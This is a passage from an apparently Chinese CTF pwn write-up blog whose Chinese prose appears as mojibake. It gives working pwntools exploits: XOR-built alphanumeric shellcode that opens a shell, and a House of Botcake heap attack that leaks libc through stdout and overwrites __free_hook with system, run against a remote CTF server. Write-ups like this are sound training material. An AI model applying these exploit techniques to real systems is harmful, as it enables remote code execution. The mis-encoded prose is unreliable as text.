å°„å‡ºæ¥çš„åœ°å€0x10000ç»™åˆ°rcxå¯„å­˜å™¨ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡å¦‚ä¸‹ä»£ç ,å»å°†å¼‚æˆ–åçš„ç»“æœå†™å…¥å†…å­˜ä¸­  å…ˆè®©eaxç½®ç©ºï¼Œè¿™æ ·å»å’Œä¸€ç»„æ•°æ®å¼‚æˆ–çš„æ—¶å€™ï¼Œå°±ä¼šç›´æ¥è¢«èµ‹å€¼ä¸ºé‚£ç»„æ•°æ®ï¼Œç„¶åå†å»å’ŒåŸæœ¬åœ°å€é‡Œçš„æ•°æ®è¿›è¡Œå¼‚æˆ–ï¼Œè¿›è¡Œå¼‚æˆ–åçš„ç»“æœåˆè¢«æ”¾è¿›äº†å†…å­˜ä¸­ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor eax,0x31315756</span><br><span class="line">xor dword ptr[rcx+0x50],eax</span><br></pre></td></tr></table></figure><p>ç°åœ¨å°±è€ƒè™‘æ€ä¹ˆåšå‡ºæ¥pop rsiå’Œpop rdiä»¥åŠsyscallæŒ‡ä»¤ã€‚ä»–ä»¬çš„æœºå™¨ç åˆ†åˆ«ä¸º0x5f 0x5e 0x0f05ã€‚</p><p>æˆ‘ä»¬éœ€è¦æŠŠè¿™å››ä¸ªå­—èŠ‚æœºå™¨ç ç»™åˆ†æˆä¸¤æ‰¹å†™å…¥ï¼Œå› ä¸º0x5f5eéœ€è¦å¼‚æˆ–ä¸¤æ¬¡åšå‡ºæ¥ï¼Œè€Œ0x0f05éœ€è¦å¼‚æˆ–ä¸€æ¬¡åšå‡ºæ¥ï¼Œå¦‚æœæ”¾åˆ°ä¸€èµ·çš„è¯ç¬¬äºŒæ¬¡å¼‚æˆ–ï¼Œé™¤éæˆ‘ä»¬å¸ƒç½®ä¸€ä¸ª0x0000å’Œ0x0f05å¼‚æˆ–ï¼Œæ‰å¯ä»¥ä¿ç•™0x0f05ï¼Œå¦åˆ™0x0f05å°±ä¼šè¢«æ”¹å˜ã€‚ä½†æ˜¯æˆ‘ä»¬æ— æ³•å°†0x0000è¾“å…¥è¿›å»ï¼Œæ‰€ä»¥åªèƒ½ä¸¤æ‰¹åˆ†å¼€å†™å…¥ã€‚</p><p>æˆ‘ä»¬å…ˆå°†0x5f5eå†™å…¥åˆ°å†…å­˜é‡Œã€‚</p><p>é¦–å…ˆæˆ‘ä»¬è¦è€ƒè™‘æœ€åˆåœ¨0x10000ä¸Šé¢å†™å…¥0x4848(è¿™ä¸ª0x4848æ˜¯å•¥éƒ½è¡Œï¼Œåªè¦èƒ½é€šè¿‡æ£€æŸ¥ï¼Œæˆ‘åªæ˜¯æœ€åˆéšæ„æ‰¾äº†ä¸ª0x4848)ã€‚æˆ‘ä»¬æœ€åæƒ³è®©0x5f5eå‡ºç°åœ¨å†…å­˜é‡Œï¼Œé‚£å°±éœ€è¦å»æ‹¿0x4848å’Œ0x5e5f(ç”±äºå°ç«¯åº)å»å¼‚æˆ–ä¸€æ¬¡ï¼Œå¾—åˆ°0x1617ï¼Œè€Œ0x1617æˆ‘ä»¬è‚¯å®šæ˜¯è¾“å…¥ä¸è¿›å»çš„ï¼Œæ‰€ä»¥è¿˜éœ€è¦å†å¼‚æˆ–ä¸€æ¬¡å¾—åˆ°0x1617ã€‚è¿™æ¬¡æˆ‘æ‰¾çš„æ˜¯0x4141ï¼Œå› æ­¤é‚£0x4141å’Œ0x1617å¼‚æˆ–ï¼Œå¾—åˆ°çš„ç»“æœæ˜¯0x5756ï¼Œç„¶åå‘ç°0x5756å¯ä»¥è¾“å…¥è¿›å»ã€‚</p><p>å› æ­¤æ€è·¯ä¸ºï¼šå…ˆå°†0x4141å†™åˆ°å†…å­˜ï¼Œç„¶åæ‹¿0x5756å’Œè¿™æ®µå†…å­˜å¼‚æˆ–ï¼Œæ­¤æ—¶çš„å†…å­˜å€¼ä¸º0x1617ã€‚æˆ‘ä»¬å†æ‹¿0x4848å’Œè¿™æ®µå†…å­˜å¼‚æˆ–å°±å¾—åˆ°äº†0x5e5fã€‚</p><img src="../img/image-20221024213005259.png" alt="image-20221024213005259" style="zoom:50%;" /><img src="../img/image-20221024213207843.png" alt="image-20221024213207843" style="zoom:50%;" /><img src="../img/image-20221024213320203.png" alt="image-20221024213320203" style="zoom:50%;" /><p>ç„¶åå¦‚æ³•ç‚®åˆ¶æ„é€ å‡ºæ¥syscallæŒ‡ä»¤ã€‚</p><p>å› ä¸ºæ„é€ pop rdiå’Œpop rsiæŒ‡ä»¤ï¼Œå°±æ„å‘³ç€åœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦å‹æ ˆå‚æ•°ã€‚è§‚å¯Ÿæ­¤æ—¶çš„å¯„å­˜å™¨çŠ¶æ€ï¼Œæˆ‘ä»¬éœ€è¦ç»™rsi 0x10000ï¼Œéœ€è¦ç»™rdi 0ã€‚æ­£å¥½rbxå’Œrcxå¯„å­˜å™¨æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œè€Œä¸”æˆ‘ä»¬è¿˜èƒ½ç”¨push rbx push rcxã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨0x10050-0x2çš„ä½ç½®å†™ä¸‹push rbxå’Œpush rcxçš„æœºå™¨ç ã€‚</p><p><img src="/../img/image-20221024213552704.png" alt="image-20221024213552704"></p><p>æœ€åæ‰§è¡Œç³»ç»Ÿè°ƒç”¨readï¼ŒæŠŠè·å–shellçš„shellcodeç»™é‡æ–°è¯»å…¥ä¸€æ¬¡å³å¯ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1324)</span></span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor eax,0x31315756</span></span><br><span class="line"><span class="string">xor dword ptr[rcx+0x50],eax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor eax,0x31314848</span></span><br><span class="line"><span class="string">xor dword ptr[rcx+0x50],eax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor eax,0x3131444e</span></span><br><span class="line"><span class="string">xor dword ptr[rcx+0x52],eax</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.send((asm(shellcode).ljust(<span class="number">0x50</span>-<span class="number">2</span>,<span class="string">b&#x27;\x58&#x27;</span>)+<span class="string">b&#x27;\x51\x53&#x27;</span>+<span class="string">b&#x27;\x41&#x27;</span>*<span class="number">4</span>).ljust(<span class="number">512</span>,<span class="string">b&#x27;\x58&#x27;</span>))</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x100</span>+shellcode_store(<span class="string">&quot;shell_64&quot;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Magic-Book"><a href="#Magic-Book" class="headerlink" title="Magic_Book"></a>Magic_Book</h2><h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><p>è¿™é“é¢˜åˆ©ç”¨çš„æ˜¯house of botcakeã€‚ç¬¬ä¸€æ¬¡é‡åˆ°è¿™ä¸ªæ‰‹æ³•ï¼Œå…ˆç®€å•è®°å½•ä¸€ä¸‹è¯¥æ‰‹æ³•æ˜¯å¦‚ä½•åˆ©ç”¨çš„ã€‚</p><p>åœ¨2.29ä»¥åçš„glibcç‰ˆæœ¬ä¸­åŠ å…¥äº†keyæœºåˆ¶ï¼Œè¿›å…¥tcache binçš„å †å—ä¼šè¢«æ·»åŠ ä¸€ä¸ªkeyå­—æ®µ(ä¹Ÿå°±æ˜¯tcache_perthread_structçš„åœ°å€)ï¼Œä½äºchunkçš„bkä½ç½®ã€‚å¦‚æœä¹‹åé‡Šæ”¾å †å—å‡†å¤‡è¿›å…¥tcache binçš„æ—¶å€™ï¼Œå‘ç°å †å—çš„keyå­—æ®µä½ç½®å·²ç»æ˜¯tcache_perthread_structçš„åœ°å€ï¼Œé‚£å°±å»éå†å½“å‰tcache binï¼Œå¦‚æœå‘ç°å·²ç»å­˜åœ¨äº†å½“å‰å †å—ï¼Œé‚£ä¹ˆå°±ä¼šæŠ¥å‡º free(): double free detected in tcache 2çš„é”™è¯¯ã€‚</p><p>è€Œhouse of botcakeçš„æ€è·¯æ˜¯ï¼Œå…ˆå°†å †å—æ”¾å…¥unsorted binä¸­(æ­¤å¤„è¦åˆ©ç”¨UAFæ¼æ´)ï¼Œè¿™æ ·é¿å…äº†keyçš„ä½ç½®æ˜¯tcache_perthread_structçš„åœ°å€ã€‚ç„¶åæˆ‘ä»¬å†æ¬¡é‡Šæ”¾è¯¥å †å—è®©å…¶è¿›å…¥tcache binï¼Œè¿™æ ·å°±ç»•è¿‡äº†æ£€æŸ¥ã€‚å®Œæˆäº†double freeï¼Œè®©åŒä¸€ä¸ªå †å—å³å‡ºç°åœ¨äº†unsorted binä¸­åˆå‡ºç°åœ¨äº†tcache binä¸­ã€‚</p><p>ä¸¾ä¸ªä¾‹å­:</p><p>æˆ‘ä»¬å…ˆç”³è¯·ä¸ƒä¸ªå †å—ï¼Œå‡†å¤‡ä¸€ä¼šå°†å…¶é‡Šæ”¾ï¼Œå»å¡«æ»¡tcache bin(å¦‚ä¸‹)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *p[<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">p[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†ç”³è¯·ä¸¤ä¸ª0x100çš„å †å—ä»¥åŠä¸€ä¸ªé˜²æ­¢å’Œtop chunkåˆå¹¶çš„å †å—(å¦‚ä¸‹)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *prev=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="type">void</span> *victim=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p>æ¥ç€å°†æœ€åˆçš„ä¸ƒä¸ªå †å—å…¨éƒ¨é‡Šæ”¾ï¼Œå¡«æ»¡tcache bin(å¦‚ä¸‹)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">free</span>(p[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬å…ˆå»é‡Šæ”¾ä½äºé«˜åœ°å€çš„victimï¼Œå®ƒå°†è¿›å…¥unsorted binï¼Œç„¶åé‡Šæ”¾ä½äºä½åœ°å€çš„prevï¼Œå®ƒä¹Ÿä¼šè¿›å…¥unsorted binï¼Œè€Œä¸”å°†ä¸victimåˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„ä½äºunsorted binçš„ä¸€ä¸ªå †å—(å¦‚ä¸‹)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"><span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬å†ç”³è¯·å‡ºæ¥ä¸€ä¸ª0x100çš„å †å—(å› ä¸ºtcache binå…·æœ‰ç»å¯¹çš„ä¼˜å…ˆæƒï¼Œæ‰€ä»¥è¿™ä¸ªå †å—ä¼šä»tcache biné‡Œå–å‡ºæ¥ï¼Œè€Œæ­¤æ—¶çš„tcache binå°±åªæœ‰6ä¸ªå †å—ï¼Œç©ºå‡ºæ¥äº†ä¸€ä¸ª)ï¼Œç„¶åæˆ‘ä»¬å°†victimå†é‡Šæ”¾æ‰ï¼Œæ­¤æ—¶çš„victimè¿›å…¥tcache binã€‚è¿™æ ·æˆ‘ä»¬åªè¦ä»unsorted binç”³è¯·å‡ºæ¥ä»»æ„ä¸€ä¸ªå¤§å°çš„å †å—(èƒ½è¦†å†™åˆ°victimçš„fdæŒ‡é’ˆå¹¶ä¸”å¤§å°ä¸ä¸º0x100)ï¼Œå°±å¯ä»¥æ‰“ä¸€ä¸ªtcache poisoningã€‚(å¦‚ä¸‹)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br></pre></td></tr></table></figure><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-2"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-2" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/image-20221025213323159.png" alt="image-20221025213323159"></p><h3 id="ç¨‹åºé€»è¾‘ï¼š"><a href="#ç¨‹åºé€»è¾‘ï¼š" class="headerlink" title="ç¨‹åºé€»è¾‘ï¼š"></a>ç¨‹åºé€»è¾‘ï¼š</h3><p>ç¨‹åºæ²¡æœ‰editå‡½æ•°å’Œshowå‡½æ•°ï¼Œç„¶åæœ‰åªèƒ½ç”¨ä¸€æ¬¡çš„UAFæ¼æ´ã€‚å¯¹ç”³è¯·çš„å­—èŠ‚æ•°è¿˜æœ‰é™åˆ¶ï¼Œæœ€å¤§ä¸º0x100ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯ï¼š-2"><a href="#åˆ©ç”¨æ€è·¯ï¼š-2" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>è¿™é¢˜å¦‚æœå•çº¯çš„æ‰“house of botcakeï¼Œé‚£ä¹ˆåç»­åªèƒ½æ‰“io leakæ³„éœ²ä¸€ä¸ªå †åœ°å€ã€‚å¦‚æœæƒ³ç¬¬äºŒæ¬¡æ‰“tcache poisoningçš„è¯ï¼Œå°±å¿…é¡»è¦è¿›è¡Œä¸€ç‚¹å¸ƒå±€ã€‚</p><p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹å•çº¯çš„io leakç”¨house of botcakeæ˜¯æ€ä¹ˆå¸ƒå±€çš„ã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#prev</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#victim</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    uaf(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;\xa0\x46&#x27;</span>)<span class="comment">#stdout struct</span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1401</span>,<span class="number">0x13e9</span>,<span class="number">0x13f5</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;here&#x27;</span>)</span><br><span class="line">    payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#io leak</span></span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x1ec980</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å°±æ˜¯æœ€ç®€å•çš„ä¸€ä¸ªhouse of botcakeçš„å¸ƒå±€ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯åœ¨<code>add(0x100,&#39;here&#39;)</code>è¿™è¡Œæ‰§è¡Œçš„æ—¶å€™ï¼Œæƒ…å†µå¦‚ä¸‹:</p><p><img src="/../img/image-20221026104029350.png" alt="image-20221026104029350"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å°†è¦ç”³è¯·çš„tcache binçš„å †å—ä¸º0x110ï¼Œè€Œç”³è¯·å‡ºæ¥çš„æ—¶å€™ï¼Œæ˜¯å¯ä»¥æ§åˆ¶unsorted binçš„sizeï¼Œå¦‚æœæˆ‘ä»¬å°†unsorted binçš„sizeæ”¹æˆä¸€ä¸ªæ›´å¤§çš„size(è®©unsorted biné‡ŒåŒ…å«ä¸€ä¸ªtcache binä¸­çš„å †å—)ï¼Œè¿™æ ·ä¸‹æ¬¡åˆ‡å‰²unsorted binçš„æ—¶å€™ï¼Œåˆèƒ½å¤Ÿæ§åˆ¶é‡Œé¢è¢«åŒ…å«çš„é‚£ä¸ªtcache binçš„å †å—çš„fdæŒ‡é’ˆï¼Œä»è€Œè¾¾åˆ°ç¬¬äºŒæ¬¡çš„tcache poisoningã€‚</p><p>ä¸è¿‡ç”±äº2.31çš„glibcç‰ˆæœ¬ä¸­ï¼Œå¯¹unsorted binçš„æ£€æŸ¥è¾ƒä¸ºä¸¥æ ¼ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¼ªé€ ä¸€ä¸ªsizeå’Œprev_sizeæ¥ä¿è¯unsorted binåœ¨ç¯¡æ”¹sizeåä¾ç„¶èƒ½é€šè¿‡æ£€æŸ¥ã€‚</p><p>æœ€åéœ€è¦æ³¨æ„çš„å°±æ˜¯ï¼Œåœ¨ç¬¬ä¸€æ¬¡tcache poisoningæ”»å‡»å0x110çš„é“¾å·²ç»æ— æ³•è¿›è¡Œç¬¬äºŒæ¬¡çš„tcache poisoningäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æå‰å¸ƒç½®ä¸€æ¡æ–°çš„é“¾ï¼Œä¾¿äºç¬¬äºŒæ¬¡çš„tcache poisoningã€‚</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">9</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#prev</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#victim</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#second tcache poisoning.after the first tcache poisoning,the 0x100 tcache chain will bad</span></span><br><span class="line">    <span class="comment">#so we need to prepare 0x80 tcache chain</span></span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">14</span>+p64(<span class="number">0x180</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#size and prev_size of unsigned bin to be forged</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    uaf(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#take one from tcache bin</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#let the fd pointer of unsorted bin local tcache bin</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;\xa0\x46&#x27;</span>)<span class="comment">#stdout struct</span></span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">18</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x180</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#tamper size of unsorted bin</span></span><br><span class="line">    payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#io leak</span></span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x1ec980</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">12</span>)</span><br><span class="line">    delete(<span class="number">2</span>)<span class="comment">#second tcache poisoning</span></span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">12</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x90</span>)+p64(free_hook)</span><br><span class="line">    add(<span class="number">0xb0</span>,payload)<span class="comment">#Cut a piece of memory from unsorted bin to control the fd pointer of tcache bin </span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1401</span>,<span class="number">0x13e9</span>,<span class="number">0x13f5</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,p64(sys_addr))  </span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;heap&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25633&quot;</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221026105053790.png" alt="image-20221026105053790"></p><p>æœ€å¼€å§‹å¤ç°è¿™é¢˜çš„æ—¶å€™ï¼ŒæŒºæ‡µçš„ã€‚é€šè¿‡ä¸æ–­è°ƒè¯•roderickå¸ˆå‚…çš„expï¼Œæ¸æ¸çŸ¥é“äº†è¿™é¢˜çš„åšæ³•(å…¶å®æ˜¯æˆ‘å¤ªèœäº†ï¼ŒèŠ±äº†ä¸€å¤©æ‰å¼„æ‡‚)ã€‚ä¸è¿‡æœ€åä¹Ÿä»…ä»…æ˜¯çŸ¥é“äº†è¿™é¢˜çš„åšæ³•å’Œæ€è·¯ï¼Œä½†ä¸æ˜ç™½è¿™ä¸ªå¸ƒå±€æ˜¯æ€ä¹ˆåšå‡ºæ¥çš„ï¼Œäºæ˜¯ç¬¬äºŒå¤©æ—©ä¸ŠæŠŠexpåˆ äº†ï¼Œè‡ªå·±é‡æ–°å†™äº†ä¸€ä¸‹è¿™é“é¢˜ï¼ŒæŒ‰ç…§è‡ªå·±çš„æ€è€ƒèµ°äº†ä¸€éï¼Œæ‰å½»åº•æ˜ç™½äº†ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå¸ƒå±€ã€‚</p><p>å…¶å®è¿™ä¹Ÿè¯´æ˜äº†åœ¨å †çš„å¸ƒå±€ä¸Šï¼Œä¸èƒ½åªçŸ¥å…¶ç„¶ï¼Œæ›´è¦çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚</p><h3 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h3><p><a href="https://www.cnblogs.com/LynneHuan/p/16822129.html">DASCTF X GFCTF 2022åæœˆæŒ‘æˆ˜èµ› pwn wp - LynneHuan - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://forum.butian.net/share/1709">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-æ·±å…¥ç†è§£ House of Botcake å †åˆ©ç”¨æ‰‹æ³• (butian.net)</a></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcodeç¼–å†™ </tag>
            
            <tag> house of botcake </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X CBCTF 2022ä¹æœˆæŒ‘æˆ˜èµ› pwnéƒ¨åˆ†wp</title>
      <link href="/posts/da4f7b20.html"/>
      <url>/posts/da4f7b20.html</url>
      
        <content type="html"><![CDATA[<h2 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/2706180-20220919100434467-653241350.png"></p><h3 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h3><p><img src="/../img/2706180-20220919100444183-1653075701.png"></p><p>é¦–å…ˆæ˜¯printfå‡½æ•°%så¯ä»¥æ³„éœ²ä¸€ä¸ªlibcåœ°å€(è®©è¾“å…¥å†™æ»¡)ï¼Œç„¶åå­˜åœ¨ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ´ï¼Œä½†æ˜¯ifè¿›è¡Œäº†ä¸€äº›æ£€æŸ¥ï¼Œæ— æ³•åˆ©ç”¨%pæˆ–è€…%xæ¥æ³„éœ²åœ°å€ï¼Œå‡ºé¢˜äººè¿™é‡Œä»…ä»…å°±æ˜¯æƒ³è®©æˆ‘ä»¬å»ä»»æ„å†™è€Œéä»»æ„è¯»ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>ç”±äºç¨‹åºæ˜¯ç³»ç»Ÿè°ƒç”¨exité€€å‡ºçš„ï¼Œå› 